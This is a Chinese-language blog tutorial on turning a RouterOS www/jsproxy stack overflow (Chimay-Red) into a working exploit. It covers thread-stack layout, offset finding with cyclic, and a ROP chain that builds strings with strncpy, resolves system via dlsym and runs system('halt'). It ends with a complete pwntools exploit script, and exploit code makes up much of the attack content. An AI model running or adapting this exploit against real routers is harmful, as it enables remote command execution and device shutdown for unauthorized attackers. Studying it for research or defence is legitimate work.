---
title: 一步一步 Pwn RouterOS之exploit构造
authorId: hac425
tags:
  - rop by dlsym
  - rop by strncpy
categories:
  - pwn_router_os
date: 2018-01-06 00:48:00
---
### 前言

---
本文由 **本人** 首发于 先知安全技术社区：  https://xianzhi.aliyun.com/forum/user/5274

---

前面已经分析完漏洞，并且搭建好了调试环境，本文将介绍如何利用漏洞写出 `exploit`

### 正文


**控制 eip**

看看我们现在所拥有的能力


![paste image](http://oy9h5q2k4.bkt.clouddn.com/15151713048316b66g6te.png?imageslim)

我们可以利用 `alloca` 的 `sub esp *` 把栈抬高，然后往 那里写入数据。

现在的问题是我们栈顶的上方有什么重要的数据是可以修改的。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515171497999x0f7vynu.png?imageslim)

一般情况下，我们是没办法利用的，因为 栈上面就是 堆， 而他们之间的地址是不固定的。 

为了利用该漏洞，需要了解一点多线程实现的机制，不同线程拥有不同的线程栈， 而线程栈的位置就在 进程的 栈空间内。线程栈 按照线程的创建顺序，依次在 栈上排列。线程栈的大小可以指定。默认大概是 8MB.

写了一个小程序，测试了一下。
```
#include <pthread.h>
#include <stdio.h>
#include <sys/time.h>
#include <string.h>
#define MAX 10
pthread_t thread[2];
pthread_mutex_t mut;
int number=0, i;
void *thread1()
{
		int a;
        printf("thread1 %p\n", &a);
}
void *thread2()
{
       	int a;
        printf("thread2 %p\n", &a);
}
void thread_create(void)
{
        int temp;
        memset(&thread, 0, sizeof(thread));          //comment1
        /*创建线程*/
        if((temp = pthread_create(&thread[0], NULL, thread1, NULL)) != 0)       //comment2
                printf("线程1创建失败!\n");
        else
                printf("线程1被创建\n");
        if((temp = pthread_create(&thread[1], NULL, thread2, NULL)) != 0)  //comment3
                printf("线程2创建失败");
        else
                printf("线程2被创建\n");
}
void thread_wait(void)
{
        /*等待线程结束*/
        if(thread[0] !=0) {                   //comment4
                pthread_join(thread[0],NULL);
                printf("线程1已经结束\n");
        }
        if(thread[1] !=0) {                //comment5
                pthread_join(thread[1],NULL);
                printf("线程2已经结束\n");
        }
}
int main()
{
        /*用默认属性初始化互斥锁*/
        pthread_mutex_init(&mut,NULL);
        printf("我是主函数哦，我正在创建线程，呵呵\n");
        thread_create();
        printf("我是主函数哦，我正在等待线程完成任务阿，呵呵\n");
        thread_wait();
        return 0;
}
```

就是打印了两个线程中的栈内存地址信息，然后相减，就可以大概知道线程栈的大小。
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515171997712kemr24ne.png?imageslim)

多次运行发现，线程栈之间应该是相邻的，因为打印出来的值的差是固定的。


线程栈也是可以通过 `pthread_attr_setstacksize` 设置, 在 `RouterOs` 的 `www`的 `main` 函数里面就进行了设置。


![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515172296024czdw05qh.png?imageslim)

所以在 `www` 中的线程栈的大小 为 `0x20000`。


当我们同时开启两个 `socket` 连接时，进程的栈布局

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515172554545mn6hijda.png?imageslim)

此时在 `线程 1` 中触发漏洞，我们就能修改 `线程 2` 的数据。

现在的思路就很简单了，我们去修改 线程2 中的某个返回地址， 然后进行 `rop`.为了精确控制返回地址。先使用 `cyclic` 来确定返回地址的偏移.因为该程序线程栈的大小为 `0x20000` 所以用一个大一点的值试几次就能试出来。
```
from pwn import *

def makeHeader(num):
    return "POST /jsproxy HTTP/1.1\r\nContent-Length: " + str(num) + "\r\n\r\n"


s1 = remote("192.168.2.124", 80)
s2 = remote("192.168.2.124", 80)


s1.send(makeHeader(0x20900))
sleep(0.5)
pause()
s2.send(makeHeader(0x100))
sleep(0.5)
pause()

s1.send(cyclic(0x2000))
sleep(0.5)
pause()

s2.close()  # tigger 
pause()
```

崩溃后的位置
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515203525302ht7bhy5u.png?imageslim)

然后用 `eip` 的值去计算下偏移

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515203624359611r5xlg.png?imageslim)

然后调整 `poc` 测试一下
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515203798622buq6fgpb.png?imageslim)

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515203815266tllctxmq.png?imageslim)

ok, 接下来就是 `rop` 了。


**rop**


程序中没有 `system`, 所以我们需要先拿到 `system` 函数的地址，然后调用 `system` 执行命令即可。

这里采取的 `rop` 方案如下。

- 首先 通过 `rop` 调用 `strncpy` 设置我们需要的字符串（我们只有一次输入机会）
- 然后调用 `dlsym` , 获取 `system` 的函数
- 调用 `system` 执行命令


使用 `strncpy` 设置我们需要的字符串的思路非常有趣。 因为我们只有一次的输入机会，而`dlsym` 和 `system` 需要的参数都是 字符串指针， 所以我们必须在 调用它们之前把 需要的字符串事先布置到已知的地址，使用 `strncpy` 我们可以使用 程序文件中自带的一些字符来拼接字符串。


下面看看具体的 `exp`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515204586149s7886t42.png?imageslim)

首先这里使用 了 `ret 0x1bb` 用来把栈往下移动了一下，因为程序运行时会修改其中的一些值，导致 `rop` 链被破坏，把栈给移下去就可以绕过了。（这个自己调 `rop` 的时候注意看就知道了。）

首先我们得设置 `system` 字符串 和 要执行的命令 这里为 `halt`(关机命令)。 以 `system` 字符串 的构造为例。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515204942477uir3mq2s.png?imageslim)
分3次构造了 `system` 字符串，首先设置 `sys` , 然后 `te` , 最后 `m`.
 
同样的原理设置好 `halt` , 然后调用 `dlsym` 获取  `system` 的地址。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15152051616411xqvk27b.png?imageslim)
执行 `dlsym(0, "system") ` 即可获得 `system` 地址， 函数返回时保存在 `eax`, 所以接下来 在栈上设置好参数（`halt` 字符串的地址） 然后 `jmp eax` 即可。

下面调试看看
首先 `ret 0x1bb`, 移栈
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515205323369xyzljof1.png?imageslim)

然后是执行 `strncpy` 设置 `system`.

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515205402433o5soeoxp.png?imageslim)

设置完后，我们就有了 `system`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515205476774vuyjgswn.png?imageslim)

然后执行 `dlsym(0, "system") ` 

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515205601990727005zg.png?imageslim)

执行完后， `eax` 保存着 `system` 函数的地址

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515205780535xi426xmw.png?imageslim)

然后利用 `jmp eax` 调用 `system("halt")`.

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515205845365jiu6x47t.png?imageslim)

运行完后，系统就关机了。



### 最后
理解了多线程的机制。 对于不太好计算的，可以猜个粗略的值，然后使用 `cyclic` 来确定之。 `strncpy` 设置字符串的技巧不错。 `dlsym(0, "system")` 可以用来获取函数地址。调试 `rop` 时要细心，`rop` 链被损坏使用 `ret *` 之类的操作绕过之。一些不太懂的东西，写个小的程序测试一下。



**exp**

```
from pwn import *

def makeHeader(num):
    return "POST /jsproxy HTTP/1.1\r\nContent-Length: " + str(num) + "\r\n\r\n"


s1 = remote("192.168.2.124", 80)
s2 = remote("192.168.2.124", 80)


s1.send(makeHeader(0x20900))
sleep(0.5)
pause()
s2.send(makeHeader(0x100))
sleep(0.5)
pause()



strncpy_plt = 0x08050D00
dlsym_plt = 0x08050C10

system_addr = 0x0805C000 + 2
halt_addr = 0x805c6e0

#pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# .text:08059C03                 pop     ebx
# .text:08059C04                 pop     esi
# .text:08059C05                 pop     ebp
# .text:08059C06                 retn
ppp_addr = 0x08059C03
pp_addr = 0x08059C04
pppppr_addr = 0x080540b4
# 0x0805851f : ret 0x1bb
ret_38 = 0x0804ae8c
ret_1bb = 0x0805851f
ret = 0x0804818c
# make system str

payload = ""
payload += p32(ret_1bb)   # for bad string
payload += p32(ret)
payload += "A" * 0x1bb
payload += p32(ret) # ret


payload += p32(strncpy_plt)
payload += p32(pppppr_addr)
payload += p32(system_addr)
payload += p32(0x0805ab58)  # str syscall
payload += p32(3)
payload += "B" * 8 # padding


payload += p32(strncpy_plt)
payload += p32(pppppr_addr)
payload += p32(system_addr + 3)
payload += p32(0x0805b38d)  # str tent
payload += p32(2)
payload += "B" * 8 # padding



payload += p32(strncpy_plt)
payload += p32(pppppr_addr)
payload += p32(system_addr + 5)
payload += p32(0x0805b0ec)  # str mage/jpeg
payload += p32(1)
payload += "B" * 8 # padding


payload += p32(strncpy_plt)
payload += p32(pppppr_addr)
payload += p32(halt_addr)
payload += p32(0x0805670f)  
payload += p32(2)
payload += "B" * 8 # padding


payload += p32(strncpy_plt)
payload += p32(pppppr_addr)
payload += p32(halt_addr + 2)
payload += p32(0x0804bca1)  
payload += p32(2)
payload += "B" * 8 # padding


# call dlsym(0, "system") get system addr
payload += p32(dlsym_plt)
payload += p32(pp_addr)
payload += p32(0)
payload += p32(system_addr)

payload += p32(0x0804ab5b)
payload += "BBBB"  # padding ret
payload += p32(halt_addr)



s1.send(cyclic(1612) + payload + "B" * 0x100)
sleep(0.5)
pause()
s2.close()

pause()
```


**参考**


https://github.com/BigNerd95/Chimay-Red